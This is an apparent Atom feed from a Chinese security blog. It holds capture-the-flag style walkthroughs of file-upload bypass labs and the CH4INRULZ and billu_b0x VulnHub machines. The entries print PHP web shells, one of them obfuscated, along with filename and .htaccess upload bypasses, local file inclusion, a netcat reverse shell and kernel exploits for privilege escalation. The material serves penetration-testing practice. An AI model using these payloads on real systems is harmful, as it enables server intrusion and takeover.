<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>埼玉天非</title>
  
  <subtitle>web总是春天</subtitle>
  <link href="http://xzajyjs2.ltd/atom.xml" rel="self"/>
  
  <link href="http://xzajyjs2.ltd/"/>
  <updated>2021-09-23T16:46:30.453Z</updated>
  <id>http://xzajyjs2.ltd/</id>
  
  <author>
    <name>xiaoxiufa</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="http://xzajyjs2.ltd/2021/10/12/uploadfile1/"/>
    <id>http://xzajyjs2.ltd/2021/10/12/uploadfile1/</id>
    <published>2021-10-11T18:28:31.720Z</published>
    <updated>2021-09-23T16:46:30.453Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件上传通关靶场（上）"><a href="#文件上传通关靶场（上）" class="headerlink" title="文件上传通关靶场（上）"></a>文件上传通关靶场（上）</h2><span id="more"></span><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><blockquote><p>文件上传就是绕过web前端，后端的验证，把可以执行的木马，脚本等可执行命令程序上传到数据库中，从而达到控制服务器的目的.文件上传时绕过有很多种类型。此次我们通过靶场来进行试验</p></blockquote><h3 id="文件上传绕过类型"><a href="#文件上传绕过类型" class="headerlink" title="文件上传绕过类型"></a>文件上传绕过类型</h3><h3 id="统一绕过"><a href="#统一绕过" class="headerlink" title="统一绕过"></a>统一绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">前段验证(js验证)</span><br><span class="line">Content-Type绕过(可以在burpsuit里面修改)</span><br><span class="line">文件包含绕过(会把包含的任意文件当成php执行)</span><br><span class="line">后缀名绕过</span><br><span class="line">条件绕过</span><br><span class="line">二次渲染绕过</span><br><span class="line">压缩文件自动解压绕过</span><br><span class="line">文件内容分析绕过</span><br><span class="line">请求绕过(get,post请求)</span><br><span class="line">htaccess文件辅助绕过</span><br><span class="line">特殊绕过</span><br></pre></td></tr></table></figure><h3 id="windows特性绕过"><a href="#windows特性绕过" class="headerlink" title="windows特性绕过"></a>windows特性绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">空格绕过</span><br><span class="line">::$DATA绕过(加在所上传文件后面)</span><br><span class="line">后缀名大小写绕过</span><br><span class="line">点绕过</span><br><span class="line">追加绕过</span><br></pre></td></tr></table></figure><h3 id="后缀名绕过"><a href="#后缀名绕过" class="headerlink" title="后缀名绕过"></a>后缀名绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.  PHP:</span><br><span class="line">2.  php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定)</span><br><span class="line">3.  ASP:</span><br><span class="line">4.  asa、cer、cdx</span><br><span class="line">5.  ASPX:</span><br><span class="line">6.  ascx、ashx、asac</span><br><span class="line">7.  JSP:</span><br><span class="line">8.  jsp、jspx、jspf</span><br></pre></td></tr></table></figure><h3 id="文件木马"><a href="#文件木马" class="headerlink" title="文件木马"></a>文件木马</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h3><h4 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h4><blockquote><p>先直接上传一个php木马，出现了报错</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该文件不允许上传，请上传.jpg|.png|.gif类型的文件,当前文件类型为：.php</span><br></pre></td></tr></table></figure><blockquote><p>先考虑前端验证(为js拦截)，可以直接把js关了<br><img src="/img/pass-01.jpg"></p></blockquote><h4 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h4><blockquote><p>直接上传一个php文件会有提示，用burpsuit抓包，把content-type修改</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure><h4 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h4><blockquote><p>这题是黑名单(不允许上传.asp,.aspx,.php,.jsp后缀文件),</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以尝试用php2、php3、php5、phtml、pht后缀名代替php</span><br></pre></td></tr></table></figure><h4 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h4><blockquote><p>这题也是黑名单,可以尝试使用htaccess文件辅助上传<br>.htaccess文件内容(可以在burpsuit里面把文件名去掉)</p></blockquote><ol><li>.htaccess文件内容<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shell1&quot;&gt;  </span><br><span class="line">SetHandler application/x-httpd-php  </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><blockquote><p>和.htaccess文件在同一个文件夹里面文件名为shell1的任意文件以php执行</p></blockquote></li><li>把shell1.php文件后缀名修改，改为shell1.jpg</li></ol><h4 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h4><blockquote><p>尝试使用本地文件包含漏洞</p></blockquote><ol><li>在后端发现了文件包含的文件(要存在这个文件,要注意文件位置)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span><br><span class="line">*/</span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">if(isset($file))&#123;</span><br><span class="line">    include $file;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    show_source(__file__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>这个文件包含会把包含的文件当做php执行<br> 2.上传一个包含木马的jpg文件<br> 3.用文件包含执行木马<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/uploadlans/include.php?file=./upload/shell.jpg</span><br></pre></td></tr></table></figure></li><li>总结：先找到文件包含位置文件，再用请求的参数(这里为file)对木马执行</li></ol><h4 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h4><blockquote><p>后缀名大小写过滤</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上传文件名为   shell1.Php</span><br></pre></td></tr></table></figure><h4 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h4><blockquote><p>空格绕过(windows里面不允许后缀名中有空格)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先用burpsuit抓包</span><br><span class="line">对文件后缀名后面加上空格</span><br></pre></td></tr></table></figure><h4 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h4><blockquote><p>这个和上一个一样，只是后缀名后面加点(.)</p></blockquote><h4 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h4><blockquote><p>::$DATA是windows的NTFS文件系统中的默认属性</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用burpsuit抓包</span><br><span class="line">修改shell1.php--&gt;shell.php::$DATA</span><br></pre></td></tr></table></figure><h4 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h4><p>方法一</p><blockquote><p>由于去点去空有次数限制，所以我们比它多一次就好</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">burpsuit抓包</span><br><span class="line">文件名改为shell1.php. .</span><br></pre></td></tr></table></figure><p>方法二(追加绕过)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用burpsuit抓包</span><br><span class="line">第一次上传shell1.php:.jpg(此时到数据库中变成了一个空的shell1.php文件)</span><br><span class="line">第二次上传shell1.&gt;&gt;&gt;(只是加入空文件内容，第一次不会有内容)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;文件上传通关靶场（上）&quot;&gt;&lt;a href=&quot;#文件上传通关靶场（上）&quot; class=&quot;headerlink&quot; title=&quot;文件上传通关靶场（上）&quot;&gt;&lt;/a&gt;文件上传通关靶场（上）&lt;/h2&gt;</summary>
    
    
    
    
    <category term="漏洞利用" scheme="http://xzajyjs2.ltd/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    <category term="文件上传" scheme="http://xzajyjs2.ltd/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="http://xzajyjs2.ltd/2021/10/12/CH4INRULZ_v1.0.1/"/>
    <id>http://xzajyjs2.ltd/2021/10/12/CH4INRULZ_v1.0.1/</id>
    <published>2021-10-11T18:15:04.701Z</published>
    <updated>2021-09-23T16:49:24.137Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CH4INRULZ-v1-0-1通关"><a href="#CH4INRULZ-v1-0-1通关" class="headerlink" title="CH4INRULZ_v1.0.1通关"></a>CH4INRULZ_v1.0.1通关</h2><span id="more"></span><h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><blockquote><p>这个综合测试有几个小坑，作为第一次尝鲜，希望能帮助各位成功绕过，这个题主要难点是在去寻找文件上传的路径。</p></blockquote><p>靶场的环境下载地址:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/ch4inrulz-101,247/</span><br></pre></td></tr></table></figure><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li>端口扫描<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.10.57</span><br></pre></td></tr></table></figure></li><li>目录扫描<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &#x27;192.168.10.57&#x27;</span><br><span class="line">dirsearch -u &#x27;192.168.10.57:21&#x27;</span><br><span class="line">dirsearch -u &#x27;192.168.10.57:22&#x27;</span><br><span class="line">dirsearch -u &#x27;192.168.10.57:8011&#x27;</span><br></pre></td></tr></table></figure><img src="/img/ch4_1.jpg"><br><img src="/img/ch4_2.jpg"><br><img src="/img/ch4_3.jpg"><blockquote><p>发现了服务器开放了21,22,80,8011端口，看见21端口开放，我们可以尝试用xftp进行连接，发现需要输入用户名，密码，是不行的，22号端口也需要ftp条件，所以现在要进行对网站目录扫描，发现了./development，./index.html，./api</p></blockquote><h2 id="查看敏感目录"><a href="#查看敏感目录" class="headerlink" title="查看敏感目录"></a>查看敏感目录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.用御剑扫描,会发现一个index.html.bak文件，访问/index.php.bak发现下载了一个 文件，里面用./development中的用户名和密码，但是密码被加密了</span><br><span class="line">(1)解密index.php.bak中的密码:</span><br><span class="line">使用kali中的john进行解密,把解密内容放在123.txt 文件中</span><br><span class="line">john 123.txt</span><br><span class="line">2, 访问./api会发现文件包含</span><br><span class="line">   http://192.168.10.57:8011/api/files_api.php(是post文件包含)</span><br><span class="line">   (1)对passwd文件进行文件包含</span><br><span class="line">   发现了/var/www/目录，这个目录主要是网站根目录</span><br><span class="line">   可以先用/etc/passwd进行测试，得出其文件包含可行(file=/etc/passwd)</span><br><span class="line">3.访问/development后面会通过提示会发现文件上传(post进行文件上传)</span><br><span class="line">   http://192.168.10.57/development/uploader/</span><br></pre></td></tr></table></figure><h2 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h2></li><li>现在我们文件上传过后没有路径，我们需要寻找上传的路径，我们因为已经知道有文件包含，尝试使用伪协议，对文件上传中的反馈文件进行源代码的获取（要进行base64解密），发现了上传文件是存在于/var/www/development/uploader//FRANKuploads/中，现在就可以尝试上传木马了</li><li>木马文件上传<br>这个上传是白名单，发现可以上传gif结尾的文件，所以直接在木马文件中加上GIF89a,再把文件名修改成muma1.gif，上传成功后，通过文件包含执行<br>muma1.gif文件：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF98</span><br><span class="line">&lt;?php @eval($_POST[&#x27;a&#x27;])?&gt;</span><br></pre></td></tr></table></figure><h2 id="通过蚁剑连接服务器"><a href="#通过蚁剑连接服务器" class="headerlink" title="通过蚁剑连接服务器"></a>通过蚁剑连接服务器</h2></li><li>通过文件包含执行木马<br><img src="/img/ch4_4.jpg"></li><li>蚁剑连接<br><img src="/img/ch4_5.jpg"><br><img src="/img/ch4_6.jpg"><br>执行蚁剑虚拟终端<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Uname -a</span><br></pre></td></tr></table></figure>发现可以使用脏牛提权</li><li>脏牛提权的github下载地址<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/FireFart/dirtycow</span><br></pre></td></tr></table></figure>现在我们需要把这个脚本运行在目标服务器上，可以在本地搭建一个网站，在目标服务器下载</li><li>本机linux执行命令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer :80</span><br></pre></td></tr></table></figure></li><li>目标服务器远程下载脏牛脚本(最好在tmp目录底下执行，这样权限比较高)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.10.54/dirty.c</span><br></pre></td></tr></table></figure></li><li>给脚本提升权限<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 dirty.c</span><br></pre></td></tr></table></figure></li><li>脚本的编译与执行<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./dirty.c</span><br><span class="line">./dirty 12345</span><br></pre></td></tr></table></figure><blockquote><p>然后用原来的文件包含执行/etc/passwd，发现有一个firefart用户，密码为12345</p></blockquote></li><li>本机使用ssh连接<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh firefart@192.168.10.57</span><br></pre></td></tr></table></figure>连接后输入密码12345 ，发现提权成功</li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;CH4INRULZ-v1-0-1通关&quot;&gt;&lt;a href=&quot;#CH4INRULZ-v1-0-1通关&quot; class=&quot;headerlink&quot; title=&quot;CH4INRULZ_v1.0.1通关&quot;&gt;&lt;/a&gt;CH4INRULZ_v1.0.1通关&lt;/h2&gt;</summary>
    
    
    
    
    <category term="综合测试" scheme="http://xzajyjs2.ltd/tags/%E7%BB%BC%E5%90%88%E6%B5%8B%E8%AF%95/"/>
    
    <category term="文件上传，漏洞利用，文件包含，伪协议，信息收集" scheme="http://xzajyjs2.ltd/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>billu b0x靶场通关</title>
    <link href="http://xzajyjs2.ltd/2021/10/12/billu_b0x/"/>
    <id>http://xzajyjs2.ltd/2021/10/12/billu_b0x/</id>
    <published>2021-10-11T18:08:12.471Z</published>
    <updated>2021-10-11T18:27:31.677Z</updated>
    
    <content type="html"><![CDATA[<p>为了图新鲜感，做了这一个靶场，<a href="http://www.vulnhub.com/entry/billu-b0x,188/">下载地址</a></p><span id="more"></span><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>这个靶场很有意思，其实他最新颖的地方就是里面有一个文件下载，我们就可以去尝试下载我们扫描出来的文件，对代码进行分析，关于文件上传路径，是否存在文件包含，这些都是能够通过分析源文件代码能够得到。<br>我在做这个实验时候遇到一个大坑，里面出现了phpmyadmin数据库管理系统，他就默认有一个config.inc.php文件，这个是我的知识盲区，通过这个靶场，我也是悟到了。</p></blockquote><h3 id="渗透步骤"><a href="#渗透步骤" class="headerlink" title="渗透步骤"></a>渗透步骤</h3><p>我这里靶场网址为<code>http://192.168.130.135/</code><br>还是用到常规方法，先观察首页东西在进行目录扫描，端口扫描发现信息，在首页他有提示有个sql注入，我经过抓包，对首页进行注入，发现不管怎么尝试，都是没反应，所以它就是个迷惑行为，因而我们直接进行扫描！！！</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.130.135</span><br></pre></td></tr></table></figure><blockquote><p>同样也可以使用工具进行扫描，目的无非就是为了扫描端口更全面</p></blockquote><p>扫描出来开放了22和80端口(开放了22号端口联想到ssh)</p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>这里我使用的是kali中的dirsearch</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192.168.130.135/&quot;</span><br></pre></td></tr></table></figure><blockquote><p>[11:13:01] 200 -  307B  - /add<br>[11:13:01] 200 -  307B  - /add.php<br>[11:13:04] 200 -    1B  - /c<br> [11:13:07] 200 -    3KB - /head.php<br>[11:13:07] 200 -    1KB - /images/<br>[11:13:07] 301 -  319B  - /images<br>[11:13:07] 200 -   47KB - /in<br>[11:13:07] 200 -    3KB - /index<br>[11:13:07] 200 -    3KB - /index.php<br>[11:13:09] 302 -    2KB - /panel  -&gt;  index.php<br>[11:13:09] 302 -    2KB - /panel.php  -&gt;  index.php<br>[11:13:10] 200 -    8KB - /phpmy/<br>[11:13:11] 200 -    1B  - /show<br>[11:13:12] 200 -   72B  - /test<br>[11:13:12] 200 -   72B  - /test.php</p></blockquote><h3 id="网页分析"><a href="#网页分析" class="headerlink" title="网页分析"></a>网页分析</h3><p>1.打开./phpmy/  发现出现一个数据库登录窗口  </p><p>2.打开./test.php  发现这个页面通过包含文件的方式，可以对文件的后端源码进行下载，这时候我们就可以对add.php index.php   panel.php test.php文件进行下载，读取源代码  </p><p>3.其实这个时候就可以发现add.php这个文件出现的文件上传页面是假的  </p><p>4.他是phpmyadmin的数据库管理，他默认有一个配置文件config.inc.php,路径在/var/www/phpmy/config.inc.php,通过./test页面的下载功能下载下来，会发现服务器登录的用户名和密码<br>        <img src="/img/nillu_2.jpg"><br>    5.再通过test.php功能下载读取linux默认用户文件/etc/passwd,发现了用一个root用户，其实到现在我们就可以尝试用ssh登录一下，前面是已经发现开放22端口<br>    <img src="/img/nillu_3.jpg">  </p><pre><code> 其实现在我们已经成功入侵了他的服务器，而且是以root权限登录，但现在我们的网站数据库还没有进去，我们尝试进行另外一种方法进行入侵</code></pre><p>6.读取c.php，会发现连接数据库的用户名和密码<br>    <img src="/img/nillu_1.jpg"><br>7.登录进入数据库过后，发登录用户名和密码<br>    <img src="/img/nillu_4.jpg"><br>当我们发现数据库里面的登录信息时候，一般就是网站登录窗口的登录用户名和密码</p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><blockquote><p>当登录后台后，发现有个地方可以上传图片，以及显示上传图片的地方，所以现在出现了文件上传，同样我们知道了上传文件的路径，现在距离入侵仅仅需要考虑怎么去执行这个木马(由于上传类型是白名单，只能上传图片文件，可是里面白名单里面说了可以上传.gif结尾的文件),其实在判断他的上传类型时候，你可以进行不断尝试，也可以对上传文件的那个页面通过前面的./test.php对源代码进行下载，然后分析</p></blockquote><p>上传的木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$uf=&quot;snc3&quot;; //pass is sqzr</span><br><span class="line">$ka=&quot;IEBldmFbsK&quot;; </span><br><span class="line">$pjt=&quot;CRfUE9TVF&quot;; </span><br><span class="line">$vbl = str_replace(&quot;ti&quot;,&quot;&quot;,&quot;tistittirti_rtietipltiatice&quot;); </span><br><span class="line">$iqw=&quot;F6ciddKTs=&quot;; </span><br><span class="line">$bkf = $vbl(&quot;k&quot;, &quot;&quot;, &quot;kbakske6k4k_kdkekckokdke&quot;); </span><br><span class="line">$sbp = $vbl(&quot;ctw&quot;,&quot;&quot;,&quot;ctwcctwrectwatctwectw_fctwuncctwtctwioctwn&quot;); </span><br><span class="line">$mpy = $sbp(&#x27;&#x27;, $bkf($vbl(&quot;b&quot;, &quot;&quot;, $ka.$pjt.$uf.$iqw))); $mpy(); </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>先把木马后缀名改为.gif，再通过抓包，再文件内容前面加上GIF89a,再修改Content-Type<br><img src="/img/nillu_5.jpg"><br>现在我们木马文件已经上传成功，现在主要是需要对文件进行执行，在读取panel.php源代码时候其实在里面是存在文件包含的<br><img src="/img/nillu_6.jpg"><br>执行系统命令可以成功，现在我们可以有两种方法，一种是上传一个php木马，一种是利用nc反弹shell</p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><h4 id="写入一句话木马"><a href="#写入一句话木马" class="headerlink" title="写入一句话木马"></a>写入一句话木马</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php @eval(\$_POST[&#x27;a&#x27;])?&gt;&quot; &gt; ./uploaded_images/123.php</span><br></pre></td></tr></table></figure><p><img src="/img/nillu_7.jpg"><br>其实可以先上传txt的文件，看他是否过滤掉木马的一些内容，你可以发现他过滤掉了$_POST,所以我在前面加了\</p><h4 id="连接木马"><a href="#连接木马" class="headerlink" title="连接木马"></a>连接木马</h4><p>我是通过蚁剑连接的，也可以通过其他软件，然后打开虚拟终端<br>![/img/nillu_8.jpg]<br>发现不是root权限，所以我们需要提权</p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>查看服务器内核版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>发现内核版本为3.13.0<br>在Kali里面查找版本漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 3.13.0</span><br></pre></td></tr></table></figure><p><img src="/img/nillu_9.jpg"><br>我用的第一个漏洞<br>找到漏洞在kali中位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate exploits/linux/local/37292.c</span><br></pre></td></tr></table></figure><p>然后下载这个漏洞<br>查看靶场服务器可用的目录权限(蚁剑虚拟终端)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br><span class="line">发现了uploaded_images文件夹有可读可写可执行权限，所以我们把漏洞文件放在此文件夹下面</span><br></pre></td></tr></table></figure><p>如果直接用虚拟终端是无法提权的<br>我们可以尝试用nc 反弹shell,绕过使用虚拟终端</p><h4 id="nc反弹shell提权"><a href="#nc反弹shell提权" class="headerlink" title="nc反弹shell提权"></a>nc反弹shell提权</h4><p>在kali里面建立nc监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>在文件包含的位置执行反弹命令(注意：一定要对传入的反弹命令参数值需要进行url编码)<br><img src="/img/nillu_10.jpg"><br>然后在反弹shell中提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /uploaded_images   进入漏洞所在文件夹</span><br><span class="line">chmod 777 37292.c  给予漏洞文件权限</span><br><span class="line">gcc 37292.c -o 37292  编译漏洞文件</span><br><span class="line">此时会在目录中生产37292的文件</span><br><span class="line">chmod 37292</span><br><span class="line">./37292</span><br></pre></td></tr></table></figure><p><img src="/img/nillu_11.jpg"><br>提权成功</p><h3 id="尾言"><a href="#尾言" class="headerlink" title="尾言"></a>尾言</h3><p>这个靶场还是很有意思，有各种绕过，各种阻拦，希望小伙伴多多练习！！！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;为了图新鲜感，做了这一个靶场，&lt;a href=&quot;http://www.vulnhub.com/entry/billu-b0x,188/&quot;&gt;下载地址&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="综合测试" scheme="http://xzajyjs2.ltd/tags/%E7%BB%BC%E5%90%88%E6%B5%8B%E8%AF%95/"/>
    
    <category term="文件上传，漏洞利用，文件包含，信息收集" scheme="http://xzajyjs2.ltd/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="nc反弹shell" scheme="http://xzajyjs2.ltd/tags/nc%E5%8F%8D%E5%BC%B9shell/"/>
    
  </entry>
  
  <entry>
    <title>dc-9实战</title>
    <link href="http://xzajyjs2.ltd/2021/10/12/dc-9/"/>
    <id>http://xzajyjs2.ltd/2021/10/12/dc-9/</id>
    <published>2021-10-11T17:59:35.635Z</published>
    <updated>2021-10-11T18:26:56.456Z</updated>
    
